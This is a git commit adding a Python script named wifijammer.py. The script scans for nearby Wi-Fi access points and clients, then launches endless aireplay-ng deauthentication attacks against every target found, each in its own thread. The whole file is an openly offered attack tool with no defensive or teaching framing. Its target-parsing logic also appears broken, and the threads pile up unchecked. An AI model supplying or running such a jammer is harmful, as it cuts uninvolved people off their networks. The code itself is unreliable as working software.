269927465a2567d3db78e201597ba648f0cdf0bd
neonfirelulz <jasonlovespell@gmail.com>
2024-09-16 14:55:07 +0800

    Add files via upload

---
+++ wifijammer.py
@@ -0,0 +1,40 @@
+import os
+import time
+import subprocess
+import threading
+
+def deauth_attack(interface, bssid, client_mac):
+    while True:
+        # Send deauthentication packet to target client
+        os.system(f"aireplay-ng -0 1 -a {bssid} -c {client_mac} {interface}")
+        time.sleep(0.5)
+
+def scan_for_targets(interface):
+    # Scan for nearby access points
+    scan_output = subprocess.check_output(["iwlist", interface, "scan"])
+    scan_results = scan_output.decode("utf-8")
+    
+    targets = []
+    for line in scan_results.split("\n"):
+        if "Address:" in line:
+            bssid = line.split("Address: ")[1]
+        elif "ESSID:" in line:
+            essid = line.split('"')[1]
+        elif "Extra:" in line:
+            if "Station" in line:
+                client_mac = line.split("Station: ")[1]
+                targets.append((bssid, client_mac))
+    
+    return targets
+
+if __name__ == "__main__":
+    interface = "wlan0"  # Change to your WiFi interface
+    scan_interval = 10  # Scan for targets every 10 seconds
+
+    while True:
+        targets = scan_for_targets(interface)
+        print(f"Found {len(targets)} targets:")
+        for bssid, client_mac in targets:
+            print(f"  BSSID: {bssid}, Client: {client_mac}")
+            threading.Thread(target=deauth_attack, args=(interface, bssid, client_mac)).start()
+        time.sleep(scan_interval)
